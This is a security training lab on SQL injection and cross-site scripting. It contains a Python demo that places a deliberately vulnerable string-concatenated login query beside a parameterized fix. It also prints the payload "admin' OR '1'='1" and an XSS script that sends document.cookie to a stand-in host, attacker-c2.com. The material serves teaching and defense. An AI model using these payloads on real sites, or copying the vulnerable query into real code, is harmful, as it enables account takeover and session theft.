# Lab 06: OWASP Top 10 Web Vulnerabilities — SQLi & XSS Mechanics

> **Associated Module:** [Module 09: Application Security Fundamentals](../docs/modules/module-09-application-security-fundamentals.md)  
> **Difficulty Level:** Intermediate  
> **Target Environment:** Isolated Web Application Sandbox (DVWA, OWASP Juice Shop, or Local Python Flask)  
> **Safety Warning:** Only execute web application attacks against systems you own or have explicit written permission to test.

---

## 🎯 Learning Objectives
By the end of this lab, you will be able to:
1. Identify the root cause of SQL Injection (SQLi) vulnerabilities in application query construction.
2. Execute authentication bypass using classic boolean-based SQL injection payloads.
3. Contrast Reflected Cross-Site Scripting (XSS) with Stored Cross-Site Scripting.
4. Implement secure code defenses including Parameterized Queries (Prepared Statements) and HTML context-aware output encoding.

---

## 🔬 Scenario: Vulnerable vs Secure Authentication Service

### Part 1: Hands-on Python Lab Environment
Create a self-contained test environment script `scripts/appsec_demo.py` to observe the backend database logic in real time:

```python
import sqlite3

# 1. Initialize In-Memory Test Database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()
cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
cursor.execute("INSERT INTO users VALUES (1, 'admin', 'SuperSecretPass123', 'Administrator')")
cursor.execute("INSERT INTO users VALUES (2, 'john_doe', 'Password456!', 'StandardUser')")
conn.commit()

print("[+] Database initialized with test users.")

# --- VULNERABLE FUNCTION (Dynamic String Concatenation) ---
def vulnerable_login(user_input, pass_input):
    query = f"SELECT id, username, role FROM users WHERE username = '{user_input}' AND password = '{pass_input}'"
    print(f"\n[VULNERABLE QUERY]: {query}")
    try:
        cursor.execute(query)
        result = cursor.fetchone()
        return result
    except Exception as e:
        return f"Database Error: {e}"

# --- SECURE FUNCTION (Parameterized Queries / Prepared Statements) ---
def secure_login(user_input, pass_input):
    query = "SELECT id, username, role FROM users WHERE username = ? AND password = ?"
    print(f"\n[SECURE PARAMETERIZED QUERY]: {query}")
    cursor.execute(query, (user_input, pass_input))
    result = cursor.fetchone()
    return result

# Execute Authentication Bypass Simulation
payload = "admin' OR '1'='1"
print("[!] Testing Vulnerable Login with Injection Payload:")
auth_vuln = vulnerable_login(payload, "any_password")
print(f"[*] Result: {auth_vuln} --> AUTHENTICATION BYPASSED!")

print("\n[!] Testing Secure Login with Identical Payload:")
auth_sec = secure_login(payload, "any_password")
print(f"[*] Result: {auth_sec} --> ACCESS DENIED (Treated as literal string)")
```

Execute the script:
```bash
python3 scripts/appsec_demo.py
```

**Expected Terminal Output:**
```text
[+] Database initialized with test users.
[!] Testing Vulnerable Login with Injection Payload:

[VULNERABLE QUERY]: SELECT id, username, role FROM users WHERE username = 'admin' OR '1'='1' AND password = 'any_password'
[*] Result: (1, 'admin', 'Administrator') --> AUTHENTICATION BYPASSED!

[!] Testing Secure Login with Identical Payload:

[SECURE PARAMETERIZED QUERY]: SELECT id, username, role FROM users WHERE username = ? AND password = ?
[*] Result: None --> ACCESS DENIED (Treated as literal string)
```

---

## 🛡️ Root Cause & Defensive Engineering

### Why the Injection Succeeded:
The single quote `'` in `admin'` closed the string literal delimiter early. The interpreter then evaluated `'1'='1'`, which is universally true, ignoring the password condition entirely.

### Why Parameterization Fixed It:
Prepared statements compile the SQL command structure **before** binding user input. The database treats `admin' OR '1'='1` entirely as a literal string value for the `username` column, neutralizing the attack.

---

## 🌐 Cross-Site Scripting (XSS) Mechanics

### Attack Demonstration:
An attacker inputs the following string into a profile comment field:
```html
<script>
  fetch('http://attacker-c2.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

### Mitigation Implementation:
1. **Context-Aware Output Encoding:** Convert sensitive HTML characters before rendering:
   - `<` becomes `&lt;`
   - `>` becomes `&gt;`
   - `"` becomes `&quot;`
   - `'` becomes `&#x27;`
2. **HTTP-Only Cookies:** Set the `HttpOnly` cookie flag on session identifiers. JavaScript (`document.cookie`) is completely blocked from accessing the token.
3. **Content Security Policy (CSP):** Enforce strict HTTP header policies:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self';
   ```
